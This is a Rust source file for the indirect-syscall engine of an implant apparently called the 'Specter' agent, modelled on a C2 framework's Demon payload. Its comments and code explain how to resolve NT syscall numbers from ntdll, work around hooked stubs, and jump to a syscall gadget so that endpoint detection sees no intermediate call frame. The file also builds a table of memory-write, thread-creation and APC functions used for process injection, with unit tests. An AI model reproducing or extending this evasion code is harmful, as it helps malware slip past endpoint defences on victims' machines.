//! Indirect syscall engine for the Specter agent.
//!
//! Resolves NT System Service Numbers (SSNs) from the `ntdll.dll` export table
//! at runtime, then invokes NT functions via an indirect `syscall` gadget address
//! found inside ntdll itself.  This bypasses user-mode EDR hooks placed at NT
//! stub entry points.
//!
//! ## Technique
//!
//! 1. Locate `ntdll.dll` in the process address space via `GetModuleHandleA`.
//! 2. Walk the PE export directory to find each `Nt*` function by name.
//! 3. Scan the function bytes for the x64 NT stub pattern:
//!    `4C 8B D1` (`mov r10, rcx`) + `B8 xx xx 00 00` (`mov eax, <ssn>`).
//! 4. If the function is hooked (bytes don't match), walk neighbouring stubs to
//!    infer the SSN by counting distance from an unhooked neighbour.
//! 5. Find the `0F 05` (`syscall`) instruction within an unhooked stub to obtain
//!    the indirect dispatch address.
//! 6. At call time:
//!    - [`sys_set_config`] stores a pointer to the [`SyscallEntry`] in `r11`.
//!    - [`sys_invoke`] loads `SSN → EAX`, then `jmp [r11]` to the indirect
//!      `syscall` address inside ntdll.  The ntdll `ret` that follows the
//!      `syscall` instruction returns directly to `sys_invoke`'s caller,
//!      leaving no intermediate frame on the call stack visible to EDR.
//!
//! ## Thread safety
//!
//! `SYSCALL_TABLE` is a [`std::sync::OnceLock`] — write-once, then read-only.
//! The `sys_set_config` / `sys_invoke` pair uses the caller-saved `r11` register
//! as a per-call communication channel; the two assembly calls must not be
//! interleaved across threads for the same logical invocation.  The per-function
//! wrapper functions in this module satisfy that requirement.
//!
//! On non-Windows builds all public functions return stub values so Linux CI
//! can compile and test the codebase without a Windows target.

#[cfg(all(windows, target_arch = "x86_64"))]
use std::sync::OnceLock;
use thiserror::Error;

#[cfg(all(windows, target_arch = "x86_64"))]
#[allow(unsafe_code)]
pub mod invoke;
pub mod wrappers;

// ── Error type ────────────────────────────────────────────────────────────────

/// Errors that can occur during syscall table initialisation or invocation.
#[derive(Debug, Error)]
pub enum SyscallError {
    /// `ntdll.dll` could not be located in the process address space.
    #[error("ntdll.dll not found in process address space")]
    NtdllNotFound,

    /// A required NT function was not found in the ntdll export table.
    #[error("NT function not found in ntdll: {0}")]
    FunctionNotFound(&'static str),

    /// The syscall table has not been initialised yet.
    #[error("syscall table not initialised — call init() first")]
    NotInitialised,
}

// ── Types ─────────────────────────────────────────────────────────────────────

/// Holds the indirect syscall instruction address and SSN for one NT function.
///
/// The layout mirrors Demon's `SYS_CONFIG` struct exactly:
///
/// | Offset | Size | Field           |
/// |--------|------|-----------------|
/// | 0      | 8    | `indirect_addr` |
/// | 8      | 4    | `ssn`           |
/// | 12     | 4    | `_pad`          |
///
/// The assembly stub `sys_invoke` loads `[r11]` (8-byte pointer to the
/// `syscall` instruction) and `[r11 + 8]` (4-byte SSN into EAX).
#[repr(C)]
#[derive(Debug, Default, Clone)]
pub struct SyscallEntry {
    /// Address of a `syscall` (0x0F 0x05) instruction within ntdll.
    pub indirect_addr: u64,
    /// System Service Number — loaded into EAX before the syscall instruction.
    pub ssn: u32,
    _pad: u32,
}

impl SyscallEntry {
    /// Returns `true` if both the indirect address and SSN have been resolved.
    #[must_use]
    pub fn is_resolved(&self) -> bool {
        self.indirect_addr != 0
    }
}

/// Table of resolved [`SyscallEntry`] values for all NT functions used by Specter.
#[derive(Debug, Default)]
pub struct SyscallTable {
    pub nt_allocate_virtual_memory: SyscallEntry,
    pub nt_write_virtual_memory: SyscallEntry,
    pub nt_read_virtual_memory: SyscallEntry,
    pub nt_free_virtual_memory: SyscallEntry,
    pub nt_protect_virtual_memory: SyscallEntry,
    pub nt_create_thread_ex: SyscallEntry,
    pub nt_open_process: SyscallEntry,
    pub nt_open_thread: SyscallEntry,
    pub nt_terminate_process: SyscallEntry,
    pub nt_terminate_thread: SyscallEntry,
    pub nt_queue_apc_thread: SyscallEntry,
    pub nt_suspend_thread: SyscallEntry,
    pub nt_resume_thread: SyscallEntry,
    pub nt_wait_for_single_object: SyscallEntry,
    pub nt_query_information_process: SyscallEntry,
    pub nt_close: SyscallEntry,
}

// ── Global singleton (Windows x86-64 only) ────────────────────────────────────

#[cfg(all(windows, target_arch = "x86_64"))]
static SYSCALL_TABLE: OnceLock<SyscallTable> = OnceLock::new();

/// Return the global [`SyscallTable`], or `None` if [`init`] has not been called.
///
/// Always returns `None` on non-Windows targets.
#[must_use]
pub fn table() -> Option<&'static SyscallTable> {
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        SYSCALL_TABLE.get()
    }
    #[cfg(not(all(windows, target_arch = "x86_64")))]
    {
        None
    }
}

/// Initialise the global syscall table by scanning ntdll.
///
/// Idempotent — safe to call multiple times; only the first call does work.
/// On non-Windows targets this is a no-op that always returns `Ok(())`.
///
/// # Errors
///
/// Returns [`SyscallError`] if ntdll cannot be found or a required function
/// could not be resolved.
pub fn init() -> Result<(), SyscallError> {
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        // Fast path: already initialised.
        if SYSCALL_TABLE.get().is_some() {
            return Ok(());
        }
        // Resolve once and attempt to set.  A concurrent init race is benign:
        // OnceLock::set returns Err if another thread beat us, which we ignore.
        let table = SyscallTable::resolve()?;
        let _ = SYSCALL_TABLE.set(table);
        Ok(())
    }
    #[cfg(not(all(windows, target_arch = "x86_64")))]
    {
        Ok(())
    }
}

// ── Public API ────────────────────────────────────────────────────────────────

/// Returns `true` if `status` represents an NTSTATUS success code (`>= 0`).
#[must_use]
pub fn nt_success(status: i32) -> bool {
    status >= 0
}

/// `STATUS_NOT_SUPPORTED` — returned by all stubs on non-Windows builds.
pub const STATUS_NOT_SUPPORTED: i32 = 0xC00000BBu32 as i32;

pub use wrappers::{
    nt_allocate_virtual_memory, nt_close, nt_create_thread_ex, nt_free_virtual_memory,
    nt_open_process, nt_protect_virtual_memory, nt_read_virtual_memory, nt_terminate_process,
    nt_wait_for_single_object, nt_write_virtual_memory,
};

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    #![allow(unsafe_code)]

    use super::*;

    /// `nt_success` must return `true` for `STATUS_SUCCESS` (0).
    #[test]
    fn nt_success_accepts_zero() {
        assert!(nt_success(0));
    }

    /// `nt_success` must return `true` for small positive NTSTATUS codes.
    #[test]
    fn nt_success_accepts_positive() {
        assert!(nt_success(0x0000_0001));
        assert!(nt_success(i32::MAX));
    }

    /// `nt_success` must return `false` for all error/warning codes (bit 31 set).
    #[test]
    fn nt_success_rejects_negative() {
        assert!(!nt_success(-1));
        assert!(!nt_success(0xC000_0000u32 as i32)); // STATUS_UNSUCCESSFUL
        assert!(!nt_success(STATUS_NOT_SUPPORTED));
    }

    /// `SyscallEntry::is_resolved` returns `false` for a default entry.
    #[test]
    fn default_entry_is_unresolved() {
        let entry = SyscallEntry::default();
        assert!(!entry.is_resolved());
    }

    /// `SyscallEntry::is_resolved` returns `true` when `indirect_addr` is set.
    #[test]
    fn resolved_entry_reports_resolved() {
        let entry = SyscallEntry { indirect_addr: 0xDEAD_BEEF, ssn: 42, _pad: 0 };
        assert!(entry.is_resolved());
    }

    /// The `SyscallEntry` repr(C) layout must match Demon's `SYS_CONFIG` exactly.
    ///
    /// offset 0: indirect_addr (8 bytes)
    /// offset 8: ssn           (4 bytes)
    /// offset 12: _pad         (4 bytes)
    /// total: 16 bytes
    #[test]
    fn syscall_entry_layout() {
        assert_eq!(std::mem::size_of::<SyscallEntry>(), 16);
        assert_eq!(std::mem::align_of::<SyscallEntry>(), 8);
        let entry = SyscallEntry { indirect_addr: 0x11223344_55667788, ssn: 0xAABB, _pad: 0 };
        let raw = unsafe {
            std::slice::from_raw_parts(
                &entry as *const SyscallEntry as *const u8,
                std::mem::size_of::<SyscallEntry>(),
            )
        };
        // indirect_addr at offset 0, little-endian.
        assert_eq!(&raw[0..8], &0x11223344_55667788u64.to_le_bytes());
        // ssn at offset 8, little-endian.
        assert_eq!(&raw[8..12], &0x0000_AABBu32.to_le_bytes());
    }

    /// SSN extraction from a known clean x64 NT stub pattern.
    ///
    /// The bytes `4C 8B D1 B8 <ssn_lo> <ssn_hi> 00 00 0F 05 C3` represent:
    ///   mov r10, rcx
    ///   mov eax, <ssn>
    ///   syscall
    ///   ret
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn extract_ssn_finds_pattern() {
        // Build a fake NT stub with SSN = 0x0042.
        let stub: [u8; 11] = [
            0x4C, 0x8B, 0xD1, // mov r10, rcx
            0xB8, 0x42, 0x00, 0x00, 0x00, // mov eax, 0x42
            0x0F, 0x05, // syscall
            0xC3, // ret
        ];
        let ssn = invoke::extract_ssn(stub.as_ptr());
        assert_eq!(ssn, Some(0x0042));
    }

    /// SSN extraction must return `None` when the stub starts with a hook jump.
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn extract_ssn_returns_none_for_hooked_stub() {
        // Simulated hooked stub: starts with a `jmp rel32` (0xE9 ...).
        let hooked: [u8; 11] = [0xE9, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC3];
        assert!(invoke::extract_ssn(hooked.as_ptr()).is_none());
    }

    /// `find_syscall_instruction` locates the `0F 05` pattern within a stub.
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn find_syscall_instruction_locates_syscall() {
        let stub: [u8; 11] = [
            0x4C, 0x8B, 0xD1, 0xB8, 0x42, 0x00, 0x00, 0x00, 0x0F, 0x05, // syscall at offset 8
            0xC3,
        ];
        let addr = invoke::find_syscall_instruction(stub.as_ptr());
        assert_eq!(addr, Some(stub[8..].as_ptr() as u64));
    }

    /// `find_syscall_instruction` returns `None` when no syscall is present.
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn find_syscall_instruction_returns_none_when_absent() {
        let stub: [u8; 5] = [0x4C, 0x8B, 0xD1, 0xB8, 0xC3];
        assert!(invoke::find_syscall_instruction(stub.as_ptr()).is_none());
    }

    /// SSN extraction with a non-zero high byte (e.g., SSN = 0x0123).
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn extract_ssn_handles_high_byte() {
        let stub: [u8; 11] = [
            0x4C, 0x8B, 0xD1, 0xB8, 0x23, 0x01, 0x00, 0x00, // SSN = 0x0123
            0x0F, 0x05, 0xC3,
        ];
        assert_eq!(invoke::extract_ssn(stub.as_ptr()), Some(0x0123));
    }

    /// On non-Windows, all NT wrappers return `STATUS_NOT_SUPPORTED`.
    #[cfg(not(all(windows, target_arch = "x86_64")))]
    #[test]
    fn nt_wrappers_return_not_supported_on_non_windows() {
        assert_eq!(
            nt_allocate_virtual_memory(0, std::ptr::null_mut(), 0, std::ptr::null_mut(), 0, 0),
            STATUS_NOT_SUPPORTED
        );
        assert_eq!(
            nt_write_virtual_memory(0, std::ptr::null(), std::ptr::null(), 0, std::ptr::null_mut()),
            STATUS_NOT_SUPPORTED
        );
        assert_eq!(nt_close(0), STATUS_NOT_SUPPORTED);
        assert_eq!(nt_terminate_process(0, 0), STATUS_NOT_SUPPORTED);
    }

    /// On Windows, `init()` must succeed and the table must be populated.
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn init_resolves_table_on_windows() {
        init().expect("syscall table init must succeed on Windows");
        let tbl = table().expect("table must be present after init");
        assert!(
            tbl.nt_allocate_virtual_memory.is_resolved(),
            "NtAllocateVirtualMemory must be resolved"
        );
        assert!(tbl.nt_write_virtual_memory.is_resolved(), "NtWriteVirtualMemory must be resolved");
        assert!(tbl.nt_create_thread_ex.is_resolved(), "NtCreateThreadEx must be resolved");
        assert!(tbl.nt_close.is_resolved(), "NtClose must be resolved");
    }

    /// On Windows, resolved SSNs must be plausible (non-zero, less than 0x1000).
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn resolved_ssns_are_plausible() {
        init().expect("init must succeed");
        let tbl = table().expect("table must be present");
        // NtClose is SSN 0x0F on Windows 10/11; allow a generous range.
        assert!(tbl.nt_close.ssn < 0x1000, "NtClose SSN={} is implausibly large", tbl.nt_close.ssn);
        assert_ne!(tbl.nt_close.ssn, 0, "NtClose SSN must not be zero");
    }

    /// On Windows, the indirect_addr must point to a `syscall` instruction.
    #[cfg(all(windows, target_arch = "x86_64"))]
    #[test]
    fn indirect_addr_points_to_syscall_instruction() {
        init().expect("init must succeed");
        let tbl = table().expect("table must be present");
        let addr = tbl.nt_allocate_virtual_memory.indirect_addr;
        assert_ne!(addr, 0, "indirect_addr must not be null");
        // Read the 2 bytes at the address and verify they are `0F 05` (syscall).
        let bytes = unsafe { std::slice::from_raw_parts(addr as *const u8, 2) };
        assert_eq!(
            bytes,
            &[0x0F, 0x05],
            "indirect_addr must point to a syscall (0F 05) instruction"
        );
    }
}
